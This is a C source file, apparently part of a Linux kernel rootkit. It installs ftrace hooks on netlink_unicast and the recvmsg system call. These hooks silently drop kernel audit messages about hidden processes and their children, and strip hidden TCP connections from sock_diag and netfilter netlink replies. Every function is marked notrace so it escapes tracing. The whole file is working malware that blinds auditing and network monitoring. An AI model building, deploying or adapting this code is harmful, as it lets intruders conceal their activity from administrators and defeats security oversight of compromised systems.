#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"
#include "../include/audit.h"
#include "../include/hiding_tcp.h"

static int (*orig_netlink_unicast)(struct sock *ssk, struct sk_buff *skb, u32 portid, int nonblock);
asmlinkage long (*orig_recvmsg)(const struct pt_regs *regs);

static atomic_t blocked_audits = ATOMIC_INIT(0);
static atomic_t total_audits = ATOMIC_INIT(0);

static notrace const char* find_substring_safe(const char *haystack, size_t haystack_len, 
                                               const char *needle, size_t needle_len)
{
    size_t i;
    
    if (!haystack || !needle || needle_len == 0 || needle_len > haystack_len)
        return NULL;
    
    for (i = 0; i <= haystack_len - needle_len; i++) {
        if (memcmp(haystack + i, needle, needle_len) == 0)
            return haystack + i;
    }
    
    return NULL;
}

static notrace pid_t extract_pid_from_audit_msg(const char *data, size_t len)
{
    const char *pid_start;
    char pid_str[16];
    int i, pid_len;
    long pid;
    const char *data_end;
    
    if (!data || len == 0 || len > 65536)
        return -1;
    
    data_end = data + len;
    
    pid_start = find_substring_safe(data, len, "pid=", 4);
    if (!pid_start)
        return -1;
    
    pid_start += 4;
    
    if (pid_start >= data_end)
        return -1;
    
    pid_len = 0;
    for (i = 0; i < 15 && (pid_start + i) < data_end; i++) {
        char c = pid_start[i];
        if (c >= '0' && c <= '9') {
            pid_str[pid_len++] = c;
        } else {
            break;
        }
    }
    
    if (pid_len == 0)
        return -1;
    
    pid_str[pid_len] = '\0';
    
    if (kstrtol(pid_str, 10, &pid) != 0)
        return -1;
    
    if (pid <= 0 || pid > PID_MAX_DEFAULT)
        return -1;
    
    return (pid_t)pid;
}

static notrace bool is_audit_socket(struct sock *sk)
{
    if (!sk || !sk->sk_socket)
        return false;
    
    if (sk->sk_family != AF_NETLINK)
        return false;

    if (sk->sk_protocol != NETLINK_AUDIT)
        return false;
    
    return true;
}

static notrace bool is_valid_netlink_msg(struct sk_buff *skb)
{
    struct nlmsghdr *nlh;
    
    if (!skb || !skb->data)
        return false;
    
    if (skb->len < NLMSG_HDRLEN)
        return false;
    
    nlh = (struct nlmsghdr *)skb->data;
    
    if (!NLMSG_OK(nlh, skb->len))
        return false;
    
    if (nlh->nlmsg_len > skb->len)
        return false;
    
    return true;
}

static notrace int hook_netlink_unicast(struct sock *ssk, struct sk_buff *skb, 
                                        u32 portid, int nonblock)
{
    struct nlmsghdr *nlh;
    unsigned char *payload;
    size_t payload_len;
    pid_t msg_pid;

    if (!is_audit_socket(ssk))
        goto send_normal;

    atomic_inc(&total_audits);
    
    if (!is_valid_netlink_msg(skb))
        goto send_normal;
    
    nlh = (struct nlmsghdr *)skb->data;
    payload = NLMSG_DATA(nlh);
    payload_len = nlmsg_len(nlh);
    
    if (!payload || payload_len == 0 || payload_len > 65536)
        goto send_normal;
    
    msg_pid = extract_pid_from_audit_msg((const char *)payload, payload_len);
    
    if (msg_pid > 0) {
        if (is_hidden_pid(msg_pid) || is_child_pid(msg_pid)) {
            atomic_inc(&blocked_audits);
            consume_skb(skb);
            return 0;
        }
    }

send_normal:
    return orig_netlink_unicast(ssk, skb, portid, nonblock);
}

static notrace asmlinkage long hook_recvmsg(const struct pt_regs *regs)
{
    long ret;
    int fd, err;
    struct user_msghdr __user *umsg;
    struct user_msghdr kmsg;
    struct iovec iov;
    struct socket *sock;
    int protocol;
    unsigned char *kbuf = NULL;
    long new_len;

    ret = orig_recvmsg(regs);
    
    if (ret <= 0)
        return ret;

    fd = (int)regs->di;
    umsg = (struct user_msghdr __user *)regs->si;

    err = 0;
    sock = sockfd_lookup(fd, &err);
    if (!sock)
        return ret;
    
    if (sock->sk->sk_family != AF_NETLINK) {
        sockfd_put(sock);
        return ret;
    }
    
    protocol = sock->sk->sk_protocol;
    sockfd_put(sock);
    
    if (protocol != NETLINK_SOCK_DIAG && protocol != NETLINK_NETFILTER)
        return ret;

    if (copy_from_user(&kmsg, umsg, sizeof(kmsg)))
        return ret;

    if (kmsg.msg_iovlen < 1 || !kmsg.msg_iov)
        return ret;

    if (copy_from_user(&iov, kmsg.msg_iov, sizeof(iov)))
        return ret;

    if (!iov.iov_base || iov.iov_len == 0)
        return ret;

    kbuf = kvmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, iov.iov_base, ret)) {
        kvfree(kbuf);
        return ret;
    }

    new_len = tcp_hiding_filter_netlink(protocol, kbuf, ret);

    if (new_len != ret && new_len > 0) {
        if (copy_to_user(iov.iov_base, kbuf, new_len) == 0)
            ret = new_len;
    }

    kvfree(kbuf);
    return ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("netlink_unicast", hook_netlink_unicast, &orig_netlink_unicast),
    HOOK("__x64_sys_recvmsg", hook_recvmsg, &orig_recvmsg),
};

notrace int hooking_audit_init(void)
{
    int ret;
    
    atomic_set(&blocked_audits, 0);
    atomic_set(&total_audits, 0);
    
    ret = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (ret)
        return ret;
    
    return 0;
}

notrace void hooking_audit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace int get_blocked_audit_count(void)
{
    return atomic_read(&blocked_audits);
}

notrace int get_total_audit_count(void)
{
    return atomic_read(&total_audits);
}

EXPORT_SYMBOL(hooking_audit_init);
EXPORT_SYMBOL(hooking_audit_exit);
EXPORT_SYMBOL(get_blocked_audit_count);
EXPORT_SYMBOL(get_total_audit_count);
EXPORT_SYMBOL(orig_recvmsg);